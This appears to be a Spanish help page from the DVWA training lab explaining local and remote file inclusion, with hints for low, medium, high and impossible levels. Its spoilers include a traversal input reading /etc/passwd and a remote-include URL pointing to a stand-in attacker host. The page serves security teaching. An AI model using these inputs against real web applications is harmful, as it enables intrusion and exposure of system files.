<div class="body_padded">
	<h1>Ayuda - Inclusi�n de Archivos</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>Acerca de</h3>
		<p>Algunas aplicaciones web permiten al usuario especificar la entrada que se usa directamente en las transmisiones de archivos o permite al usuario subir archivos al servidor.
		M�s adelante, la aplicaci�n web accede a la entrada proporcionada por el usuario en el contexto de las aplicaciones web. Al hacer esto, la aplicaci�n web est� permitiendo
		el potencial de ejecuci�n de archivos maliciosos.</p>

		<p>Si el archivo elegido para ser incluido es local en la m�quina de destino, se llama "Inclusi�n de archivo local (LFI). Pero los archivos tambi�n se pueden incluir en otra
                  m�quinas, que luego el ataque es una "Inclusi�n de archivo remoto (RFI).</p>

		<p>Cuando RFI no es una opci�n. el uso de otra vulnerabilidad con LFI (como la carga de archivos y el recorrido de directorios) a menudo puede lograr el mismo efecto.</p>

		<p>Tenga en cuenta que el t�rmino "inclusi�n de archivos" no es lo mismo que "acceso arbitrario a archivos" o "divulgaci�n de archivos".</p>

		<br /><hr /><br />

		<h3>Objectivo</h3>
		<p>Lea todas las <u> cinco </u> citas famosas de'<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' usando solo la inclusi�n del archivo.</p>

		<br /><hr /><br />

		<h3>Nivel Low</h3>
		<p>Esto permite la entrada directa en <u> una de las muchas funciones PHP </u> que incluir� el contenido a ejecutar.</p>

		<p>Dependiendo de la configuraci�n del servicio web, depender� si RFI es una posibilidad.</p>
		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />

		<h3>Nivel Medium</h3>
		<p>El desarrollador ha le�do algunos de los problemas con LFI / RFI, y decidi� filtrar la entrada. Sin embargo, los patrones que se usan, no son suficientes.</p>
		<pre>Spoiler: <span class="spoiler">LFI: Es posible, debido a que solo filtra a trav�s de patr�n de coincidencia con listas negras</span>.
			Spoiler: <span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>Nivel High</h3>
		<p>El desarrollador ha tenido suficiente. Decidieron permitir solo ciertos archivos para ser utilizados. Sin embargo, como hay varios archivos con el mismo nombre base,
                 usan un comod�n para incluirlos a todos.</p>
		<pre>Spoiler: <span class="spoiler">LFI: el nombre de archivo solo ha comenzado con un cierto valor.</span>.
			Spoiler: <span class="spoiler">RFI: necesita vincular en otra vulnerabilidad, como carga de archivos</span>.</pre>

		<br />

		<h3>Nivel Impossible</h3>
		<p>El desarrollador solo codifica las p�ginas permitidas, con nombres de archivo exactos. Al hacer esto, elimina todas las avenidas de ataque.</p>
	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>Referencia: <?php echo dvwaExternalLinkUrlGet( 'https://www.owasp.org/index.php/Top_10_2007-A3' ); ?></p>

</div>
